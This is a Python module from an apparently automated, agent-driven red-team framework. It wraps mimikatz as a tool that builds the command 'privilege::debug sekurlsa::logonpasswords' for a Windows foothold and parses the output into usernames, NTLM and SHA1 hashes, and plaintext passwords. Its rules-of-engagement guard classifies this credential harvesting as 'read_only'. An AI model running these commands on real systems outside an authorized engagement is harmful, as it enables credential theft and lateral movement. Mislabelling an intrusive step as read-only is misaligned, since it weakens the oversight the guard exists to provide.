import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw

log = get_logger("tools.mimikatz")


class MimikatzResult(BaseModel):
    host_ip: str
    credentials: list[dict] = Field(default_factory=list)
    raw_output_path: str = ""
    command: str = ""
    duration_sec: float = 0.0


# Regexes for the per-provider credential fields. mimikatz emits each
# credential attribute on its own line, prefixed with `` * ``.
_USERNAME_RE = re.compile(r"\*\s+Username\s*:\s*(.+?)\s*$", re.MULTILINE)
_DOMAIN_RE = re.compile(r"\*\s+Domain\s*:\s*(.+?)\s*$", re.MULTILINE)
_NTLM_RE = re.compile(r"\*\s+NTLM\s*:\s*([0-9a-fA-F]+)", re.MULTILINE)
_SHA1_RE = re.compile(r"\*\s+SHA1\s*:\s*([0-9a-fA-F]+)", re.MULTILINE)
_PASSWORD_RE = re.compile(r"\*\s+Password\s*:\s*(.+?)\s*$", re.MULTILINE)

# Provider section header — mimikatz indents these with 8 spaces and a
# trailing colon, e.g. ``        msv :``. We match any indented word
# followed by ``:`` on a line by itself.
_SECTION_RE = re.compile(r"^[ \t]+(\w+)\s*:\s*$", re.MULTILINE)


def _parse_mimikatz_output(text: str, host_ip: str) -> MimikatzResult:
    """Parse mimikatz ``sekurlsa::logonpasswords`` output into credentials.

    Walks each provider section (``msv``, ``tspkg``, ``wdigest``,
    ``kerberos``, ``ssp``, ``credman``, ...) and extracts the first
    ``* Username`` / ``* Domain`` / ``* NTLM`` / ``* SHA1`` / ``* Password``
    tuple inside it. This avoids crediting one provider's hash to another
    provider's plaintext password (which a naive global sweep would do).
    """
    result = MimikatzResult(host_ip=host_ip)
    if not text:
        return result

    section_starts = list(_SECTION_RE.finditer(text))
    for i, m in enumerate(section_starts):
        section_name = m.group(1)
        # Only consider known credential providers; skip unrelated
        # indented blocks (e.g. ``[00000003] Primary``).
        if section_name not in {
            "msv", "tspkg", "wdigest", "kerberos", "ssp",
            "credman", "livessp", "cloudap",
        }:
            continue

        section_start = m.end()
        section_end = (
            section_starts[i + 1].start() if i + 1 < len(section_starts)
            else len(text)
        )
        section = text[section_start:section_end]

        username_m = _USERNAME_RE.search(section)
        if not username_m:
            continue
        username = username_m.group(1).strip()
        domain_m = _DOMAIN_RE.search(section)
        ntlm_m = _NTLM_RE.search(section)
        sha1_m = _SHA1_RE.search(section)
        pwd_m = _PASSWORD_RE.search(section)

        # Skip empty (null) credentials with no secret material.
        if username in {"(null)", ""} and not (ntlm_m or sha1_m or pwd_m):
            continue

        result.credentials.append({
            "username": username,
            "domain": domain_m.group(1).strip() if domain_m else "",
            "ntlm": ntlm_m.group(1).lower() if ntlm_m else "",
            "sha1": sha1_m.group(1).lower() if sha1_m else "",
            "password": pwd_m.group(1).strip() if pwd_m else "",
            "provider": section_name,
        })

    return result


def _build_mimikatz_cmd() -> str:
    """Build the mimikatz command for execution on a Windows foothold.

    Returns a string (not a list) because mimikatz runs on the Windows
    foothold via the foothold shell session manager (Phase 6), not via
    ``run_subprocess`` on the AutoRed Linux host.
    """
    return 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'


@tool
@roe_guard(allowed_categories=["read_only"])
async def mimikatz_wrapper(
    foothold_id: str,
    host_ip: str,
    engagement_id: str = "",
) -> MimikatzResult:
    """Run mimikatz on a Windows foothold to harvest logon credentials.

    Mimikatz runs on the Windows foothold (not the AutoRed Linux host),
    so this tool builds the command string and saves it as raw evidence
    for execution via the foothold session manager (Phase 6). The
    parser is invoked separately against captured output.

    Args:
        foothold_id: ID of the foothold to run mimikatz on
        host_ip: IP of the foothold host
        engagement_id: Current engagement ID

    Returns:
        MimikatzResult (empty credentials until execution is wired in
        Phase 6).
    """
    log.info("mimikatz_start", host_ip=host_ip, foothold_id=foothold_id)
    cmd_str = _build_mimikatz_cmd()
    raw_path = await _save_raw("mimikatz_cmd", host_ip, cmd_str, "", engagement_id)
    log.info("mimikatz_done", host_ip=host_ip, note="command saved, execution in Phase 6")
    return MimikatzResult(host_ip=host_ip, raw_output_path=raw_path, command=cmd_str)
